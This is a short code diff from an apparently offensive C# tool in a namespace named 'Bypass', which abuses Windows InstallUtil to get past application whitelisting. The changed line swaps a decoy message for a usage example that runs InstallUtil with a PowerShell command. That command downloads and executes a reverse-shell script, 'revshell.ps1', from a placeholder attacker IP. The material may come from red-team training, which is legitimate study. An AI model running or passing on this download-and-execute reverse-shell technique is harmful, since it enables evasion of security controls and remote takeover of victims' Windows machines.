@@ -16,7 +16,7 @@ namespace Bypass
                 cmd = args[0];
             }
 
-            Console.WriteLine("Nothing going on in this binary.");
+            Console.WriteLine("Example Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /cmd=\'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.X.Y/revshell.ps1\")\' /U " + System.AppDomain.CurrentDomain.FriendlyName);
         }
     }
     [System.ComponentModel.RunInstaller(true)]
